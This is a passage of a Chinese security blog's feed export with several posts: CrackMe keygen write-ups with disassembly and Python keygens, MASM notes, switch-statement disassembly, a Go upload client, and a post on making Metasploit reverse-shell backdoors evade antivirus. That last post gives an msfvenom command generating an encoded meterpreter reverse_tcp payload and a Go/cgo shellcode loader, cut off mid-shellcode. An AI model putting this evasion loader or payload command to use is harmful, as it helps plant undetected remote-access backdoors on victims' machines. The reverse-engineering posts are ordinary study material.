9C1B4000 push Afkayas_.00401B9C ; \r\n00402597 . FFD7 call edi00402599 . 8BD0 mov edx,eax ; Afkayas_.004021910040259B . 8D4D E8 lea ecx,dword ptr ss:[ebp-0x18]0040259E . FFD3 call ebx004025A0 . 50 push eax ; Afkayas_.00402191004025A1 . 68 A81B4000 push Afkayas_.00401BA8 ; KeyGen It Now004025A6 . FFD7 call edi004025A8 . 8D4D 94 lea ecx,dword ptr ss:[ebp-0x6C]004025AB . 8945 CC mov dword ptr ss:[ebp-0x34],eax ; Afkayas_.00402191004025AE . 8D55 A4 lea edx,dword ptr ss:[ebp-0x5C]004025B1 . 51 push ecx004025B2 . 8D45 B4 lea eax,dword ptr ss:[ebp-0x4C]004025B5 . 52 push edx004025B6 . 50 push eax ; Afkayas_.00402191004025B7 . 8D4D C4 lea ecx,dword ptr ss:[ebp-0x3C]004025BA . 6A 00 push 0x0004025BC . 51 push ecx004025BD . C745 C4 08000&gt;mov dword ptr ss:[ebp-0x3C],0x8004025C4 . FF15 10414000 call dword ptr ds:[&lt;&amp;MSVBVM50.#rtcMsgBox&gt;; msvbvm50.rtcMsgBox004025CA . 8D4D E8 lea ecx,dword ptr ss:[ebp-0x18]004025CD . FF15 80414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaFreeS&gt;; msvbvm50.__vbaFreeStr004025D3 . 8D55 94 lea edx,dword ptr ss:[ebp-0x6C]004025D6 . 8D45 A4 lea eax,dword ptr ss:[ebp-0x5C]004025D9 . 52 push edx004025DA . 8D4D B4 lea ecx,dword ptr ss:[ebp-0x4C]004025DD . 50 push eax ; Afkayas_.00402191004025DE . 8D55 C4 lea edx,dword ptr ss:[ebp-0x3C]004025E1 . 51 push ecx004025E2 . 52 push edx004025E3 . EB 56 jmp short Afkayas_.0040263B004025E5 &gt; 68 C81B4000 push Afkayas_.00401BC8 ; You Get Wrong004025EA . 68 9C1B4000 push Afkayas_.00401B9C ; \r\n004025EF . FFD7 call edi004025F1 . 8BD0 mov edx,eax ; Afkayas_.00402191004025F3 . 8D4D E8 lea ecx,dword ptr ss:[ebp-0x18]004025F6 . FFD3 call ebx004025F8 . 50 push eax ; Afkayas_.00402191004025F9 . 68 E81B4000 push Afkayas_.00401BE8 ; Try Again 通过分析可以看到加密关键代码是1234567891011121314150040240F . 8B45 E4 mov eax,dword ptr ss:[ebp-0x1C] ; 用户名 -&gt; eax00402412 . 50 push eax ; /用户名 -&gt; 堆栈00402413 . 8B1A mov ebx,dword ptr ds:[edx] ; |00402415 . FF15 E4404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaLenBs&gt;; \len(用户名) -&gt; eax0040241B . 8BF8 mov edi,eax ; len(用户名) -&gt; edi0040241D . 8B4D E8 mov ecx,dword ptr ss:[ebp-0x18] ; 用户名 -&gt; ecx00402420 . 69FF FB7C0100 imul edi,edi,0x17CFB ; len(用户名) * 0x17CFB ==&gt; edi=A6ADD00402426 . 51 push ecx ; /String = NULL00402427 . 0F80 91020000 jo Afkayas_.004026BE ; |0040242D . FF15 F8404000 call dword ptr ds:[&lt;&amp;MSVBVM50.#rtcAnsiVa&gt;; \用户名去掉首字母 -&gt; edx0040243E . 57 push edi ; len(用户名) * 0x17CFB 入栈-&gt; ebp-D40040243F . FF15 E0404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrI4&gt;; 十进制(len(用户名) * 0x17CFB) + 首字母十进制ascii值 -&gt; eax0040251D . 68 701B4000 push Afkayas_.00401B70 ; &quot;AKA-&quot;入栈00402522 . 51 push ecx ; /十进制(len(用户名) * 0x17CFB) + 首字母十进制ascii值 入栈00402523 . FFD7 call edi ; \&quot;AKA-&quot;+&quot;十进制(len(用户名) * 0x17CFB) + 首字母十进制ascii值&quot; -&gt; eax 可以看出流程就是 “AKA-“+”十进制(len(用户名) * 0x17CFB) + 首字母十进制ascii值” 写注册机（Python）123456import sysusername = sys.argv[1]pwend = len(username) * 0x17CFB + ord(username[0])password = "AKA-%d"%pwendprint(password) 测试结果12C:\Users\Administrator\Desktop&gt;python 1.py akkumanAKA-682814]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[160CrackMe练手 001]]></title>
      <url>%2F2017%2F09%2F15%2F160CrackMe-001.html</url>
      <content type="text"><![CDATA[peid判断无壳，打开输入伪码注册，根据报错od查找字符串接下来定位到字符串周边代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667680042FA15 |. 8D55 F0 lea edx,[local.4]0042FA18 |. 8B83 DC010000 mov eax,dword ptr ds:[ebx+0x1DC]0042FA1E |. E8 35B0FEFF call Acid_bur.0041AA580042FA23 |. 8B45 F0 mov eax,[local.4]0042FA26 |. 0FB640 03 movzx eax,byte ptr ds:[eax+0x3]0042FA2A |. 6BF0 0B imul esi,eax,0xB0042FA2D |. 8D55 EC lea edx,[local.5]0042FA30 |. 8B83 DC010000 mov eax,dword ptr ds:[ebx+0x1DC]0042FA36 |. E8 1DB0FEFF call Acid_bur.0041AA580042FA3B |. 8B45 EC mov eax,[local.5] ; 堆栈中可看到[local.5和4]都是你输入的用户名0042FA3E |. 0FB640 02 movzx eax,byte ptr ds:[eax+0x2]0042FA42 |. 6BC0 0E imul eax,eax,0xE0042FA45 |. 03F0 add esi,eax0042FA47 |. 8935 58174300 mov dword ptr ds:[0x431758],esi0042FA4D |. A1 6C174300 mov eax,dword ptr ds:[0x43176C]0042FA52 |. E8 D96EFDFF call Acid_bur.004069300042FA57 |. 83F8 04 cmp eax,0x4 ; 如果用户名长度大于等于4跳转0042FA5A |. 7D 1D jge short Acid_bur.0042FA790042FA5C |. 6A 00 push 0x00042FA5E |. B9 74FB4200 mov ecx,Acid_bur.0042FB74 ; Try Again!0042FA63 |. BA 80FB4200 mov edx,Acid_bur.0042FB80 ; Sorry , The serial is incorect !0042FA68 |. A1 480A4300 mov eax,dword ptr ds:[0x430A48]0042FA6D |. 8B00 mov eax,dword ptr ds:[eax]0042FA6F |. E8 FCA6FFFF call Acid_bur.0042A1700042FA74 |. E9 BE000000 jmp Acid_bur.0042FB370042FA79 |&gt; 8D55 F0 lea edx,[local.4]0042FA7C |. 8B83 DC010000 mov eax,dword ptr ds:[ebx+0x1DC]0042FA82 |. E8 D1AFFEFF call Acid_bur.0041AA580042FA87 |. 8B45 F0 mov eax,[local.4] ; 取你输入的用户名0042FA8A |. 0FB600 movzx eax,byte ptr ds:[eax] ; 取用户名的第一个字母放入eax0042FA8D |. F72D 50174300 imul dword ptr ds:[0x431750] ; eax = eax * 29h0042FA93 |. A3 50174300 mov dword ptr ds:[0x431750],eax0042FA98 |. A1 50174300 mov eax,dword ptr ds:[0x431750]0042FA9D |. 0105 50174300 add dword ptr ds:[0x431750],eax ; [0x431750] = eax * 20042FAA3 |. 8D45 FC lea eax,[local.1]0042FAA6 |. BA ACFB4200 mov edx,Acid_bur.0042FBAC ; CW0042FAAB |. E8 583CFDFF call Acid_bur.00403708 ; 观察堆栈可发现&quot;CW&quot;放入了[local.1]0042FAB0 |. 8D45 F8 lea eax,[local.2]0042FAB3 |. BA B8FB4200 mov edx,Acid_bur.0042FBB8 ; CRACKED0042FAB8 |. E8 4B3CFDFF call Acid_bur.00403708 ; 观察堆栈可发现&quot;CRACKED&quot;放入了[local.2]0042FABD |. FF75 FC push [local.1] ; Acid_bur.0042FBAC0042FAC0 |. 68 C8FB4200 push Acid_bur.0042FBC8 ; - ;两个push把&quot;CW&quot;和&quot;-&quot;入栈0042FAC5 |. 8D55 E8 lea edx,[local.6]0042FAC8 |. A1 50174300 mov eax,dword ptr ds:[0x431750]0042FACD |. E8 466CFDFF call Acid_bur.00406718 ; 用户名第一个字母*29*2的值放入[local.6]0042FAD2 |. FF75 E8 push [local.6]0042FAD5 |. 68 C8FB4200 push Acid_bur.0042FBC8 ; -0042FADA |. FF75 F8 push [local.2] ; &quot;用户名第一个字母*29*2&quot;,&quot;-&quot;,&quot;CRACKED&quot;入栈0042FADD |. 8D45 F4 lea eax,[local.3]0042FAE0 |. BA 05000000 mov edx,0x50042FAE5 |. E8 C23EFDFF call Acid_bur.004039AC ; CW-算好的数据-CRACKED 放入[local.3]0042FAEA |. 8D55 F0 lea edx,[local.4]0042FAED |. 8B83 E0010000 mov eax,dword ptr ds:[ebx+0x1E0]0042FAF3 |. E8 60AFFEFF call Acid_bur.0041AA580042FAF8 |. 8B55 F0 mov edx,[local.4] ; 取出你输入的密码=&gt;edx0042FAFB |. 8B45 F4 mov eax,[local.3] ; 正确密码=&gt;eax0042FAFE |. E8 F93EFDFF call Acid_bur.004039FC0042FB03 |. 75 1A jnz short Acid_bur.0042FB1F ; 判断密码是否正确0042FB05 |. 6A 00 push 0x00042FB07 |. B9 CCFB4200 mov ecx,Acid_bur.0042FBCC ; Congratz !!0042FB0C |. BA D8FB4200 mov edx,Acid_bur.0042FBD8 ; Good job dude =)0042FB11 |. A1 480A4300 mov eax,dword ptr ds:[0x430A48]0042FB16 |. 8B00 mov eax,dword ptr ds:[eax]0042FB18 |. E8 53A6FFFF call Acid_bur.0042A1700042FB1D |. EB 18 jmp short Acid_bur.0042FB370042FB1F |&gt; 6A 00 push 0x00042FB21 |. B9 74FB4200 mov ecx,Acid_bur.0042FB74 ; Try Again!0042FB26 |. BA 80FB4200 mov edx,Acid_bur.0042FB80 ; Sorry , The serial is incorect ! 注册算法就是password = “CW-“ + 取用户名第一位asciix29x2 + “-CRACKED” 注册机（python）：12345import sysusername = sys.argv[1]password = ord(username[0])*0x29*0x2print("password:"+"CW-"+"%d"%(password)+"-CRACKED") 测试：12C:\Users\Administrator\Desktop&gt;python 1.py akkumanpassword:CW-7954-CRACKED]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Windows环境下32位汇编语言程序设计笔记-基础篇]]></title>
      <url>%2F2017%2F09%2F14%2FWindows%E7%8E%AF%E5%A2%83%E4%B8%8B32%E4%BD%8D%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0-%E5%9F%BA%E7%A1%80%E7%AF%87.html</url>
      <content type="text"><![CDATA[内存模式123.386.model flat,stdcall ;子程序调用模式，win32中只能用stdcall，因为win32api调用使用的这个option casemap:none ;定义了程序中变量和子程序名是否对大小写敏感，win32api名称区分大小写，所以只需要记住这个定式 指定使用的指令集 .model语句1.model 内存模式[,语言模式][,其他模式] 内存模式 模式 内存使用方式 tiny 用来建立.com文件，所有的代码、数据和堆栈都在同一个64KB段内 small 建立代码和数据分别用一个64KB段的.exe文件 medium 代码段可以有多个64KB段，数据段只有一个64KB段 compact 代码段只有一个64KB段，数据段可以有多个64KB段 large 代码段和数据段都可以有多个64KB段 huge 同large，并且数据段中的一个数组也可以超过64KB flat Win32程序使用的模式，代码和数据使用同一个4GB段 对于Win32程序来说，只有一种内存模式，flat模式 源程序结构12345678910111213141516.386.model flat,stdcalloption casemap:none &lt;一些include语句&gt;.stack [堆栈段的大小] ;常忽略不写.data &lt;一些初始化过的变量定义&gt;.data? &lt;一些没有初始化过的变量定义&gt;.const &lt;一些常量定义&gt;.code &lt;代码&gt; &lt;开始标号&gt; &lt;其他语句&gt; end &lt;开始标号&gt; 局部变量的定义1local 变量名1[[重复数量]][:类型],变量名2[[重复数量]][:类型]...... local伪指令必须紧接在子程序的伪指令proc后 变量的类型 名称 表示方式 缩写 字节 Byte db 字 word dw 双字(doubleword) dword dd 三字(farword) fword df 四字(quadword) qword dq 十字节BCD码(tenbyte) tbyte dt 有符号字节(signbyte) sbyte 有符号字(signword) sword 有符号双字(signdword) sdword 单精度浮点数 Real4 双精度浮点数 Real8 10字节浮点数 Real10 数据结构1234567结构名 struct字段1 类型 ?字段2 类型 ?......结构名 ends 定义12345 .data?变量名称 结构名 &lt;字段1,字段2,...&gt;;或者 .data?变量名称 结构名 &lt;&gt; 使用1234567891011121314151617181920212223242526;前提假设结构名为WNDCLASS,结构体变量名为stWndClass,里面有字段lpfnWndProc;1mov eax,stWndClass.lpfnWndProc;2.esi寄存器作指针寻址mov esi,offset stWndClassmov eax,[esi + WNDCLASS.lpfnWndProc] ;注意这里是WNDCLASS;3.用assume伪指令把寄存器预先定义为结构指针mov esi,offset stWndClassassume esi:ptr WNDCLASSmov eax,[esi].lpfnWndProc...assume esi:nothing ;注意：不使用esi做指针的时候需要用这句取消定义;4.结构的定义可以嵌套NEW_WNDCLASS structdwOption word ?oldWndClass WNDCLASS &lt;&gt;NEW_WNDCLASS ends;5.嵌套的引用mov wax,[esi].oldWndClass.lpfnWndProc 以不同的类型访问变量123456;以db定义一个缓冲区szBuffer db 1024 dup (?);mov ax,szBuffer ;错误，masm中，如果要用制定类型之外的长度访问变量，必须显式指出要访问的长度，这样编译器忽略语法上的长度检验，仅使用变量的地址;类型 ptr 变量名mov ax,word ptr szBuffermov eax,dword ptr szBuffer movzx把一个字节扩展到一个字或一个字或一个双字再放到ax或eax中，高位保持0而不是越界存取到其他的变量12345 .databTest1 db 12h .codemovzx ax,bTest1movzx eax,bTest1 变量的尺寸和数量12sizeof 变量名、数据类型或数据结构名 ;取得变量、数据类型或数据结构以字节为单位的长度lengthof 变量名、数据类型或数据结构名 ;取得变量中数据的项数 获取变量地址12345mov 寄存器,offset 变量名 ;offset是取变量地址的伪操作符lea eax,[ebp-4] ;运行时按照ebp的值实际计算出地址放到eax中;invoke伪指令参数要用到一个局部变量的地址时，参数中不可能写入lea指令，用offset又是不对的，可用addraddr 局部变量名和全局变量名 ;全局变量名时编译器按照odffset的用法来用；局部变量名时，编译器用lea先把地址取到wax中，然后用eax代替变量地址使用;invoke中使用addr时，它的左边不能使用wax，否则eax的值会被覆盖 子程序的定义123456子程序名 proc [距离][语言类型][可视区域][USES寄存器列表][,参数:类型]...[VARARG] local 局部变量列表 指令子程序名 endp 参数传递和堆栈平衡不同语言调用方式的差别 C SysCall StdCall BASIC FORTRAN PASCAL 最先入栈参数 右 右 右 左 左 左 清除堆栈者 调用者 子程序 子程序 子程序 子程序 子程序 允许使用VARARG 是 是 是 否 否 否 条件测试语句1234567寄存器或变量 操作符 操作数(表达式1) 逻辑运算符 (表达式2) 逻辑运算符 (表达式3) ...;举例，左边表达式，右边是表达式为真的条件x==3 ;x等于3eax!=3 ;eax不等于3(y&gt;=3)&amp;&amp;ebx ;y大于等于3且ebx为非零值;表达式的左边只能是变量或寄存器，不能为常数；表达式两边不能同时为变量，但可以同时是寄存器 标志位的状态指示12345CARRY? 表示Carry位是否置位OVERFLOW? 表示Overflow位是否置位PARITY? 表示Parity位是否置位SIGN? 表示Sign位是否置位ZERO? 表示Zero位是否置位 分支语句123456789.if eax &amp;&amp; (bx &gt;= dWX) || !(dWY != ecx) mov esi,1.elseif edx mov esi,2.elseif esi &amp; 1 mov esi,3.elseif ZERO? &amp;&amp; CARRY? mov esi,4.endif 循环语句1234567891011.while 条件测试表达式 指令 [.break [.if 退出条件]] [.continue].endw;或.repeat 指令 [.break [.if 退出条件]] [.continue] .until 条件测试表达式 (或 .untilcxz [条件测试表达式]) 变量和函数的命名匈牙利表示法1类型前缀+变量说明（类型用小写字母，说明则用首字母大写的几个引文单词组成） 汇编语言中常用的类型前缀 b 表示byte w 表示word dw 表示dword h 表示句柄 lp 表示指针 sz 表示以0结尾的字符串 lpsz 表示指向0结尾的字符串的指针 f 表示浮点数 st 表示一个数据结构 举例 hWinMain 主窗口的句柄 dwTimeCount 时间计数器，以双字定义 szWelcome 欢迎信息字符串，以0结尾 lpBuffer 指向缓存区的指针 stWndClass WNDCLASS结构 本书的作者建议 全局变量的定义使用标准的匈牙利表示法，在参数的前面加下划线；在局部变量的前面加@符号，这样引用的时候就能随时注意到变量的作用域。 在内部子程序的名称前面加下划线，以便和系统API区别。 举例1234567891011121314151617_Calc proc _dwX,_dwY local @dwResult finit fild _dwX fld st(0) fmul ;i * i fild _dwY fld st(0) fmul ;j * j fadd ;i * i + j * j fsqrt ;sqrt(i * i + j * j) fistp @dwResult ;put result mov eax,@dwResult ret_calc endp]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[switch反汇编(C语言)]]></title>
      <url>%2F2017%2F09%2F07%2Fswitch%E5%8F%8D%E6%B1%87%E7%BC%96-C%E8%AF%AD%E8%A8%80.html</url>
      <content type="text"><![CDATA[在分支较多的时候，switch的效率比if高，在反汇编中我们即可看到效率高的原因 0x01分支结构不超过3个12345678910111213141516171819202122#include &lt;stdio.h&gt;void main()&#123; int x = 5; switch(x) &#123; case 5: printf("%d\n",x); break; case 6: printf("%d\n",x); break; case 7: printf("%d\n",x); break; default: break; &#125; return;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495: int x = 5;00401028 mov dword ptr [ebp-4],56: switch(x)7: &#123;0040102F mov eax,dword ptr [ebp-4]00401032 mov dword ptr [ebp-8],eax //x的值放入[ebp-8]00401035 cmp dword ptr [ebp-8],500401039 je main+39h (00401049) //x与5相等就跳转，下面6和7相同0040103B cmp dword ptr [ebp-8],60040103F je main+4Ch (0040105c)00401041 cmp dword ptr [ebp-8],700401045 je main+5Fh (0040106f)00401047 jmp main+72h (00401082)8: case 5:9: printf(&quot;%d\n&quot;,x);00401049 mov ecx,dword ptr [ebp-4]0040104C push ecx0040104D push offset string &quot;%d\n&quot; (0042201c)00401052 call printf (004010d0)00401057 add esp,810: break;0040105A jmp main+83h (00401093)11: case 6:12: printf(&quot;%d\n&quot;,x);0040105C mov edx,dword ptr [ebp-4]0040105F push edx00401060 push offset string &quot;%d\n&quot; (0042201c)00401065 call printf (004010d0)0040106A add esp,813: break;0040106D jmp main+83h (00401093)14: case 7:15: printf(&quot;%d\n&quot;,x);0040106F mov eax,dword ptr [ebp-4]00401072 push eax00401073 push offset string &quot;%d\n&quot; (0042201c)00401078 call printf (004010d0)0040107D add esp,816: break;00401080 jmp main+83h (00401093)17: default:18: printf(&quot;%d\n&quot;,x);00401082 mov ecx,dword ptr [ebp-4]00401085 push ecx00401086 push offset string &quot;%d\n&quot; (0042201c)0040108B call printf (004010d0)00401090 add esp,819: break;20: &#125; 0x02分支数超过3且分支存在线性关系1234567891011121314151617181920212223242526272829#include &lt;stdio.h&gt;void main()&#123; int x = 5; switch(x) &#123; case 5: printf("%d\n",x); break; case 6: printf("%d\n",x); break; case 7: printf("%d\n",x); break; case 8: printf("%d\n",x); break; case 9: printf("%d\n",x); break; default: printf("%d\n",x); break; &#125; return;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566675: int x = 5;0040D778 mov dword ptr [ebp-4],56: switch(x)7: &#123;0040D77F mov eax,dword ptr [ebp-4]0040D782 mov dword ptr [ebp-8],eax0040D785 mov ecx,dword ptr [ebp-8]0040D788 sub ecx,5 //x减去分支中的最小值5，方便构建跳转表0040D78B mov dword ptr [ebp-8],ecx0040D78E cmp dword ptr [ebp-8],4 0040D792 ja $L537+13h (0040d7fd) //x-5&gt;4跳转到default，即x&gt;9跳转0040D794 mov edx,dword ptr [ebp-8] //edx=x-50040D797 jmp dword ptr [edx*4+40D81Fh] //构建跳转表，根据edx的值从对应地址取出值(各个分支的地址)，40D81F为跳转表起始地址8: case 5:9: printf(&quot;%d\n&quot;,x);0040D79E mov eax,dword ptr [ebp-4]0040D7A1 push eax0040D7A2 push offset string &quot;%d\n&quot; (0042201c)0040D7A7 call printf (004010d0)0040D7AC add esp,810: break;0040D7AF jmp $L537+24h (0040d80e)11: case 6:12: printf(&quot;%d\n&quot;,x);0040D7B1 mov ecx,dword ptr [ebp-4]0040D7B4 push ecx0040D7B5 push offset string &quot;%d\n&quot; (0042201c)0040D7BA call printf (004010d0)0040D7BF add esp,813: break;0040D7C2 jmp $L537+24h (0040d80e)14: case 7:15: printf(&quot;%d\n&quot;,x);0040D7C4 mov edx,dword ptr [ebp-4]0040D7C7 push edx0040D7C8 push offset string &quot;%d\n&quot; (0042201c)0040D7CD call printf (004010d0)0040D7D2 add esp,816: break;0040D7D5 jmp $L537+24h (0040d80e)17: case 8:18: printf(&quot;%d\n&quot;,x);0040D7D7 mov eax,dword ptr [ebp-4]0040D7DA push eax0040D7DB push offset string &quot;%d\n&quot; (0042201c)0040D7E0 call printf (004010d0)0040D7E5 add esp,819: break;0040D7E8 jmp $L537+24h (0040d80e)20: case 9:21: printf(&quot;%d\n&quot;,x);0040D7EA mov ecx,dword ptr [ebp-4]0040D7ED push ecx0040D7EE push offset string &quot;%d\n&quot; (0042201c)0040D7F3 call printf (004010d0)0040D7F8 add esp,822: break;0040D7FB jmp $L537+24h (0040d80e)23: default:24: printf(&quot;%d\n&quot;,x);0040D7FD mov edx,dword ptr [ebp-4]0040D800 push edx0040D801 push offset string &quot;%d\n&quot; (0042201c)0040D806 call printf (004010d0)0040D80B add esp,825: break;26: &#125; 跳转表从[edx*4+40D81Fh]取出分支的地址值然后进行jmp，下表是跳转表部分123450040D81F 9E D7 40 00 ..@.0040D823 B1 D7 40 00 ..@.0040D827 C4 D7 40 00 ..@.0040D82B D7 D7 40 00 ..@.0040D82F EA D7 40 00 ..@. 0x03分支跃度大难以构成跳转表的分支结构1234567891011121314151617181920212223242526272829#include &lt;stdio.h&gt;void main()&#123; int x = 5; switch(x) &#123; case 5: printf("%d\n",x); break; case 6: printf("%d\n",x); break; case 7: printf("%d\n",x); break; case 8: printf("%d\n",x); break; case 100: printf("%d\n",x); break; default: printf("%d\n",x); break; &#125; return;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768695: int x = 5;00401028 mov dword ptr [ebp-4],56: switch(x)7: &#123;0040102F mov eax,dword ptr [ebp-4]00401032 mov dword ptr [ebp-8],eax00401035 mov ecx,dword ptr [ebp-8]00401038 sub ecx,50040103B mov dword ptr [ebp-8],ecx0040103E cmp dword ptr [ebp-8],5Fh00401042 ja $L536+13h (004010b5) //具体参见上一种,x大于100跳转到default00401044 mov eax,dword ptr [ebp-8] //edx=x-500401047 xor edx,edx //edx置零00401049 mov dl,byte ptr (004010ef)[eax] //查询索引表并将取出来的值放入DL(在od里面的这条反汇编更清楚)0040104F jmp dword ptr [edx*4+4010D7h] //根据DL(EDX)的值查跳转表8: case 5:9: printf(&quot;%d\n&quot;,x);00401056 mov ecx,dword ptr [ebp-4]00401059 push ecx0040105A push offset string &quot;%d\n&quot; (0042201c)0040105F call printf (004011a0)00401064 add esp,810: break;00401067 jmp $L536+24h (004010c6)11: case 6:12: printf(&quot;%d\n&quot;,x);00401069 mov edx,dword ptr [ebp-4]0040106C push edx0040106D push offset string &quot;%d\n&quot; (0042201c)00401072 call printf (004011a0)00401077 add esp,813: break;0040107A jmp $L536+24h (004010c6)14: case 7:15: printf(&quot;%d\n&quot;,x);0040107C mov eax,dword ptr [ebp-4]0040107F push eax00401080 push offset string &quot;%d\n&quot; (0042201c)00401085 call printf (004011a0)0040108A add esp,816: break;0040108D jmp $L536+24h (004010c6)17: case 8:18: printf(&quot;%d\n&quot;,x);0040108F mov ecx,dword ptr [ebp-4]00401092 push ecx00401093 push offset string &quot;%d\n&quot; (0042201c)00401098 call printf (004011a0)0040109D add esp,819: break;004010A0 jmp $L536+24h (004010c6)20: case 100:21: printf(&quot;%d\n&quot;,x);004010A2 mov edx,dword ptr [ebp-4]004010A5 push edx004010A6 push offset string &quot;%d\n&quot; (0042201c)004010AB call printf (004011a0)004010B0 add esp,822: break;004010B3 jmp $L536+24h (004010c6)23: default:24: printf(&quot;%d\n&quot;,x);004010B5 mov eax,dword ptr [ebp-4]004010B8 push eax004010B9 push offset string &quot;%d\n&quot; (0042201c)004010BE call printf (004011a0)004010C3 add esp,825: break;26: &#125; 索引表123456789101112004010F1 00 01 02 03 05 05 05 05 ........004010F9 05 05 05 05 05 05 05 05 ........00401101 05 05 05 05 05 05 05 05 ........00401109 05 05 05 05 05 05 05 05 ........00401111 05 05 05 05 05 05 05 05 ........00401119 05 05 05 05 05 05 05 05 ........00401121 05 05 05 05 05 05 05 05 ........00401129 05 05 05 05 05 05 05 05 ........00401131 05 05 05 05 05 05 05 05 ........00401139 05 05 05 05 05 05 05 05 ........00401141 05 05 05 05 05 05 05 05 ........00401149 05 05 05 05 05 05 05 04 ........ 跳转表123456004010D9 58 10 40 00 X.@.004010DD 6B 10 40 00 k.@.004010E1 7E 10 40 00 ~.@.004010E5 91 10 40 00 ..@.004010E9 A4 10 40 00 ..@.004010ED B7 10 40 00 ..@.]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[最最简单的c语言函数汇编分析]]></title>
      <url>%2F2017%2F09%2F06%2F%E6%9C%80%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84c%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E6%B1%87%E7%BC%96%E5%88%86%E6%9E%90.html</url>
      <content type="text"><![CDATA[0x01 环境xp+vc6.0 0x02 代码1234int plus(int x, int y)&#123; return 0;&#125; 以下是vc6.0的反汇编窗口1234567891011121314151617181920211: int plus(int x, int y)2: &#123;00401020 push ebp00401021 mov ebp,esp00401023 sub esp,40h00401026 push ebx00401027 push esi00401028 push edi00401029 lea edi,[ebp-40h]0040102C mov ecx,10h00401031 mov eax,0CCCCCCCCh00401036 rep stos dword ptr [edi]3: return 0;00401038 xor eax,eax4: &#125;0040103A pop edi0040103B pop esi0040103C pop ebx0040103D mov esp,ebp0040103F pop ebp00401040 ret 0x03 分析12345678910111213141516171819202122232425push ebpmov ebp,espsub esp,40h//提升栈，为函数腾出空间，为ebp寻址做准备push ebxpush esipush edi//寄存器压栈，保存现场lea edi,[ebp-40h]//将ebp-40h（esp）的具体内存地址存到edimov ecx,10h//10（十六进制）存入计数寄存器mov eax,0xCCCCCCCC//初始化eaxrep stos dword ptr [edi]//用eax中的值初始化到es:[edi]指向的地址，长度为dword，循环执行次数为eax中的值（恰好ebp-&gt;esp全部被初始化）xor eax,eax//eax清零pop edipop esipop ebxmov esp,ebppop ebpret//寄存器出栈，恢复现场，堆栈平衡并返回]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Golang模拟客户端POST表单功能文件上传]]></title>
      <url>%2F2017%2F07%2F07%2FGolang%E6%A8%A1%E6%8B%9F%E5%AE%A2%E6%88%B7%E7%AB%AFPOST%E8%A1%A8%E5%8D%95%E5%8A%9F%E8%83%BD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.html</url>
      <content type="text"><![CDATA[客户端通过multipart.Write把文件的文本流写入一个缓存中，然后调用http的Post方法把缓存传到服务器。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960package mainimport ( "bytes" "fmt" "io" "io/ioutil" "mime/multipart" "net/http" "os")func postFile(filename string, targetUrl string) error &#123; bodyBuf := &amp;bytes.Buffer&#123;&#125; bodyWriter := multipart.NewWriter(bodyBuf) //关键的一步操作 fileWriter, err := bodyWriter.CreateFormFile("uploadfile", filename) if err != nil &#123; fmt.Println("error writing to buffer") return err &#125; //打开文件句柄操作 fh, err := os.Open(filename) if err != nil &#123; fmt.Println("error opening file") return err &#125; defer fh.Close() //iocopy _, err = io.Copy(fileWriter, fh) if err != nil &#123; return err &#125; contentType := bodyWriter.FormDataContentType() bodyWriter.Close() resp, err := http.Post(targetUrl, contentType, bodyBuf) if err != nil &#123; return err &#125; defer resp.Body.Close() resp_body, err := ioutil.ReadAll(resp.Body) if err != nil &#123; return err &#125; fmt.Println(resp.Status) fmt.Println(string(resp_body)) return nil&#125;// sample usagefunc main() &#123; target_url := "http://localhost/upload" filename := "./example.pdf" postFile(filename, target_url)&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[关于msf反弹后门的免杀Tips]]></title>
      <url>%2F2017%2F04%2F20%2Fmsf-AntiVirus.html</url>
      <content type="text"><![CDATA[msf是一个很强大的工具，我经常会在渗透用它来反弹shell，不过它生成的反弹后门会被不少杀软kill，这篇文章只是讲讲我在msf中一个简单的免杀小技巧 思路我以前接触过一款python的远控，其实说是远控，基本也就是nc的功能加了一个服务端的web页面控制并加了一些其他的功能可以用来管理诸多客户机这款远控我下载下来用过，并用pyinstaller打包成了exe（缺点是体积太过庞大），惊奇的是，360不杀它，然后自己想着其他语言是不是也会这样，于是我用golang写了一个简易版nc反弹，编译之后，也是不查杀的。python和golang有一个共同点，就是可以用来内联C编程，所以C语言的shellcode按理说应该会达到同样的效果 得到shellcode1msfvenom -p windows/meterpreter/reverse_tcp LPORT=5555 LHOST=192.168.1.100 -e x86/shikata_ga_nai -i 11 -f py &gt; 1.py 建议是生成32位的，如果想生成64位也可以，-e x86/shikata_ga_nai -i 11是指用x86/shikata_ga_nai编码迭代11次，然后生成py文件py文件打开是shellcode，我们接下来对它进行一点小改造，对于python去执行shellcode的方法，相信小伙伴都已经不陌生，在《python灰帽子》中有讲解，我今天要使用的是golang，其实个人认为golang执行shellcode的代码是更简洁的 Golang环境搭建安装Golang32位（建议32位，与前面对应，在测试过程中，如果32位shellcode配合64位golang加32位gcc，就算把golang的GOARCH改为386也依旧会失败，建议一一对应），安装gcc32位（可以使用TDM-GCC） 代码编写12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667package main/*void call(char *code) &#123; int (*ret)() = (int(*)())code; ret();&#125;*/import "C"import "unsafe"func main() &#123; buf := "" buf += "\xdd\xc6\xd9\x74\x24\xf4\x5f\x33\xc9\xb8\xb3\x5e\x2c" buf += "\xc9\xb1\x97\x31\x47\x1a\x03\x47\x1a\x83\xc7\x04\xe2" buf += "\x46\x84\xfd\x72\xee\x0e\xb5\x96\x37\x04\x6d\x63\x9f" buf += "\xcc\xa4\x3a\x8e\x8c\xf7\x39\x81\xca\xe4\x42\xff\xce" buf += 